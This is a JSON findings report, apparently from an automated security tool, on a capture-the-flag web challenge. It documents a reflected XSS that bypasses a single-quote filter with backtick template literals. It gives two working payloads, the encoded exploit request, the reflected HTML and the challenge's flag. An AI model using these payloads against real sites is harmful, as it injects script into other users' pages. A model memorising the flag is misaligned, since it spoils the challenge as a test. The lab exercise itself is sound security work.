@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:26:01.325958+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "93f4bfdd-5e2d-435a-ba60-87645093afef",
+      "timestamp": "2026-04-12T21:26:01.325701+00:00",
+      "title": "Reflected XSS via 'name' parameter \u2014 single-quote filter bypass with backtick template literals",
+      "severity": "critical",
+      "target": "http://172.17.0.1:52527/page",
+      "description": "The /page endpoint reflects the 'name' GET parameter unsanitized into an HTML <input> value attribute. The application strips single quotes, but backtick (template literal) syntax is not filtered. By breaking out of the value attribute and injecting a <script> tag or autofocus/onfocus event handler using backtick-quoted strings, an attacker can execute arbitrary JavaScript.\n\nWorking payloads:\n1. \"><script>alert(`XSS`)</script>\n2. \" autofocus onfocus=alert(`XSS`) x=\"\n\nThe challenge server validated the XSS and returned the CTF flag.",
+      "evidence": "GET /page?name=%22%3E%3Cscript%3Ealert(%60XSS%60)%3C%2Fscript%3E\n\nResponse body contains:\nCongratulations!<p> Here is the flag: flag{150348df-0912-4c0b-b000-65a0a48bf14a}\n\nReflected payload in HTML: <input type=text name=name placeholder=\"Enter your name...\" value=\"\"><script>alert(`XSS`)</script>\">",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET http://172.17.0.1:52527/page?name=%22%3E%3Cscript%3Ealert(%60XSS%60)%3C%2Fscript%3E",
+        "expected": "Response contains: flag{150348df-0912-4c0b-b000-65a0a48bf14a}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "e2b12848-86b8-4e66-a7a1-e956a99ead86",
+      "timestamp": "2026-04-12T21:26:13.450608+00:00",
+      "title": "Dalgona CTF - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Index[\"GET / - Index Page\"]\n  Index --> Page[\"GET /page?name=... - XSS Challenge\"]\n  Page --> Filter[\"Server-side Filter\\nStrips single quotes only\"]\n  Filter --> Reflect[\"Reflected Input in\\n<input value=...>\"]\n  Reflect -->|\"Backtick bypass\\nalert(`XSS`)\"| Success[\"Success: flag returned\"]\n  Reflect -->|\"Plain text or\\nsingle-quote payloads\"| Fail[\"Failed - Try again\"]\n  Page --> Static[\"Static Assets\\n/static/css/ /static/img/\"]\n  Server[\"Flask 3.1.8 / Werkzeug 3.1.8\\nPython 3.11.15\\n172.17.0.1:52527\"] --- Index\n  Server --- Page"
+    }
+  ]
+}
